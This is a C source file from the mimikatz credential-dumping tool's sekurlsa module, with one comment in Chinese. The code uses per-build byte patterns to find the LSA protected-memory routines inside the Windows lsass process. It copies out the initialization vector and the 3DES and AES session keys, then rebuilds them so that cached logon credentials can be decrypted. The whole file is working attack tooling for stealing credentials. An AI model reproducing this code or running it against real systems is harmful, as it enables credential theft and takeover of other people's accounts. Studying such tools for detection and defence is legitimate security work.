/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_nt6.h"

#ifdef _M_X64
BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d};
BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d};
BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};
KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {63, -69, 25}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {59, -61, 25}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY},{0, NULL}, {61, -73, 16}},
};
#elif defined _M_IX86
BYTE PTRN_WALL_LsaInitializeProtectedMemory_KEY[]	= {0x6a, 0x02, 0x6a, 0x10, 0x68};
KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -76, -21}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -69, -18}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}}, // post 11/11
	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
};

#endif

HMODULE kuhl_m_sekurlsa_nt6_hBCrypt = NULL;
NTSTATUS kuhl_m_sekurlsa_nt6_KeyInit = STATUS_NOT_FOUND;
PLSA_PROTECT_MEMORY kuhl_m_sekurlsa_nt6_pLsaProtectMemory = kuhl_m_sekurlsa_nt6_LsaProtectMemory, kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory = kuhl_m_sekurlsa_nt6_LsaUnprotectMemory;

PBCRYPT_OPEN_ALGORITHM_PROVIDER K_BCryptOpenAlgorithmProvider = NULL;
PBCRYPT_SET_PROPERTY K_BCryptSetProperty = NULL;
PBCRYPT_GET_PROPERTY K_BCryptGetProperty = NULL;
PBCRYPT_GENERATE_SYMMETRIC_KEY K_BCryptGenerateSymmetricKey = NULL;
PBCRYPT_ENCRYPT	K_BCryptEncrypt = NULL, K_BCryptDecrypt = NULL;
PBCRYPT_DESTROY_KEY K_BCryptDestroyKey = NULL;
PBCRYPT_CLOSE_ALGORITHM_PROVIDER K_BCryptCloseAlgorithmProvider = NULL;

KIWI_BCRYPT_GEN_KEY k3Des, kAes;
BYTE InitializationVector[16];

NTSTATUS kuhl_m_sekurlsa_nt6_init()
{
	if(!NT_SUCCESS(kuhl_m_sekurlsa_nt6_KeyInit))
	{
		if(!kuhl_m_sekurlsa_nt6_hBCrypt)
		{
			//调用加密函数函数
			if(kuhl_m_sekurlsa_nt6_hBCrypt = LoadLibrary(L"bcrypt"))
			{
				K_BCryptOpenAlgorithmProvider = (PBCRYPT_OPEN_ALGORITHM_PROVIDER) GetProcAddress(kuhl_m_sekurlsa_nt6_hBCrypt, "BCryptOpenAlgorithmProvider");
				K_BCryptSetProperty = (PBCRYPT_SET_PROPERTY) GetProcAddress(kuhl_m_sekurlsa_nt6_hBCrypt, "BCryptSetProperty");
				K_BCryptGetProperty = (PBCRYPT_GET_PROPERTY) GetProcAddress(kuhl_m_sekurlsa_nt6_hBCrypt, "BCryptGetProperty");
				K_BCryptGenerateSymmetricKey = (PBCRYPT_GENERATE_SYMMETRIC_KEY) GetProcAddress(kuhl_m_sekurlsa_nt6_hBCrypt, "BCryptGenerateSymmetricKey");
				K_BCryptEncrypt = (PBCRYPT_ENCRYPT) GetProcAddress(kuhl_m_sekurlsa_nt6_hBCrypt, "BCryptEncrypt");
				K_BCryptDecrypt = (PBCRYPT_ENCRYPT) GetProcAddress(kuhl_m_sekurlsa_nt6_hBCrypt, "BCryptDecrypt");
				K_BCryptDestroyKey = (PBCRYPT_DESTROY_KEY) GetProcAddress(kuhl_m_sekurlsa_nt6_hBCrypt, "BCryptDestroyKey");
				K_BCryptCloseAlgorithmProvider = (PBCRYPT_CLOSE_ALGORITHM_PROVIDER) GetProcAddress(kuhl_m_sekurlsa_nt6_hBCrypt, "BCryptCloseAlgorithmProvider");
			}
		}
		if(kuhl_m_sekurlsa_nt6_hBCrypt && K_BCryptOpenAlgorithmProvider && K_BCryptSetProperty && K_BCryptGetProperty && K_BCryptGenerateSymmetricKey && K_BCryptEncrypt && K_BCryptDecrypt && K_BCryptDestroyKey && K_BCryptCloseAlgorithmProvider)
			kuhl_m_sekurlsa_nt6_KeyInit = kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory();
	}
	return kuhl_m_sekurlsa_nt6_KeyInit;
}

NTSTATUS kuhl_m_sekurlsa_nt6_clean()
{
	if(kuhl_m_sekurlsa_nt6_hBCrypt)
	{
		if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_KeyInit))
			kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory();
		FreeLibrary(kuhl_m_sekurlsa_nt6_hBCrypt);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory()
{
	NTSTATUS status;
	ULONG dwSizeNeeded;

	status = K_BCryptOpenAlgorithmProvider(&k3Des.hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
	if(NT_SUCCESS(status))
	{
		status = K_BCryptSetProperty(k3Des.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		if(NT_SUCCESS(status))
		{
			status = K_BCryptGetProperty(k3Des.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &k3Des.cbKey, sizeof(k3Des.cbKey), &dwSizeNeeded, 0);
			if(NT_SUCCESS(status))
				k3Des.pKey = (PBYTE) LocalAlloc(LPTR, k3Des.cbKey);
		}
	}
	
	if(NT_SUCCESS(status))
	{
		status = K_BCryptOpenAlgorithmProvider(&kAes.hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
		if(NT_SUCCESS(status))
		{
			status = K_BCryptSetProperty(kAes.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
			if(NT_SUCCESS(status))
			{
				status = K_BCryptGetProperty(kAes.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &kAes.cbKey, sizeof(kAes.cbKey), &dwSizeNeeded, 0);
				if(NT_SUCCESS(status))
					kAes.pKey = (PBYTE) LocalAlloc(LPTR, kAes.cbKey);
			}
		}
	}

	return status;
}
VOID kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory()
{
	if (k3Des.hProvider)
		K_BCryptCloseAlgorithmProvider(k3Des.hProvider, 0);
	if (k3Des.hKey)
		K_BCryptDestroyKey(k3Des.hKey);
	LocalFree(k3Des.pKey);

	if (kAes.hProvider)
		K_BCryptCloseAlgorithmProvider(kAes.hProvider, 0);
	if (kAes.hKey)
		K_BCryptDestroyKey(kAes.hKey);
	LocalFree(kAes.pKey);
}

VOID WINAPI kuhl_m_sekurlsa_nt6_LsaProtectMemory (IN PVOID Buffer, IN ULONG BufferSize)
{
	kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);
}

VOID WINAPI kuhl_m_sekurlsa_nt6_LsaUnprotectMemory (IN PVOID Buffer, IN ULONG BufferSize)
{
	kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, FALSE);
}

NTSTATUS kuhl_m_sekurlsa_nt6_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt)
{
	BCRYPT_KEY_HANDLE *hKey;
	BYTE LocalInitializationVector[16];
	ULONG cbIV, cbResult;
	PBCRYPT_ENCRYPT cryptFunc = Encrypt ? K_BCryptEncrypt : K_BCryptDecrypt;
	RtlCopyMemory(LocalInitializationVector, InitializationVector, sizeof(InitializationVector));
	if (cbMemory % 8)
	{
		hKey = &kAes.hKey;
		cbIV = sizeof(InitializationVector);
	}
	else
	{
		hKey = &k3Des.hKey;
		cbIV = sizeof(InitializationVector) / 2;
	}
	return cryptFunc(*hKey, pMemory, cbMemory, 0, LocalInitializationVector, cbIV, pMemory, cbMemory, &cbResult, 0);
}

NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
#ifdef _M_X64
	LONG offset64;
#endif
	PKULL_M_PATCH_GENERIC currentReference;
	if(currentReference = kull_m_patch_getGenericFromBuild(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef, ARRAYSIZE(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef), cLsass->osContext.BuildNumber))
	{
		aLocalMemory.address = currentReference->Search.Pattern;
		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
	{
		aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0;
#ifdef _M_X64
		aLocalMemory.address = &offset64;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
		{
			aLsassMemory.address = (PBYTE) aLsassMemory.address + sizeof(LONG) + offset64;
#elif defined _M_IX86
		aLocalMemory.address = &aLsassMemory.address;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
		{
#endif
			aLocalMemory.address = InitializationVector;
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(InitializationVector)))
			{
				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
				if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &k3Des))
				{
					aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
					if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &kAes))
						status = STATUS_SUCCESS;
				}
			}
		}
	}
	}
	return status;
}

BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KIWI_BCRYPT_HANDLE_KEY hKey; PKIWI_HARD_KEY pHardKey;
	PVOID buffer; SIZE_T taille; LONG offset;

	if(pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_8)
	{
		taille = sizeof(KIWI_BCRYPT_KEY);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey);
	}
	else if(pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
	{
		taille = sizeof(KIWI_BCRYPT_KEY8);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY8, hardkey);
	}
	else
	{
		taille = sizeof(KIWI_BCRYPT_KEY81);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey);
	}


	if(buffer = LocalAlloc(LPTR, taille))
	{
	#ifdef _M_X64
		LONG offset64;
		aLocalMemory.address = &offset64;
		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(LONG)))
		{
			aLsassMemory->address = (PBYTE) aLsassMemory->address + sizeof(LONG) + offset64;
			aLocalMemory.address = &aLsassMemory->address;
	#elif defined _M_IX86
		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
		{
	#endif
			if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
			{
				aLocalMemory.address = &hKey;
				if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(KIWI_BCRYPT_HANDLE_KEY)) && hKey.tag == 'UUUR')
				{
					aLocalMemory.address = buffer; aLsassMemory->address = hKey.key;
					if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille) && ((PKIWI_BCRYPT_KEY) buffer)->tag == 'MSSK') // same as 8
					{
						pHardKey = (PKIWI_HARD_KEY) ((PBYTE) buffer + offset);
						if(aLocalMemory.address = LocalAlloc(LPTR, pHardKey->cbSecret))
						{
							aLsassMemory->address = (PBYTE) hKey.key + offset + FIELD_OFFSET(KIWI_HARD_KEY, data);
							if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, pHardKey->cbSecret))
								status = NT_SUCCESS(K_BCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR) aLocalMemory.address, pHardKey->cbSecret, 0));
							LocalFree(aLocalMemory.address);
						}
					}
				}
			}
		}
		LocalFree(buffer);
	}
	return status;
}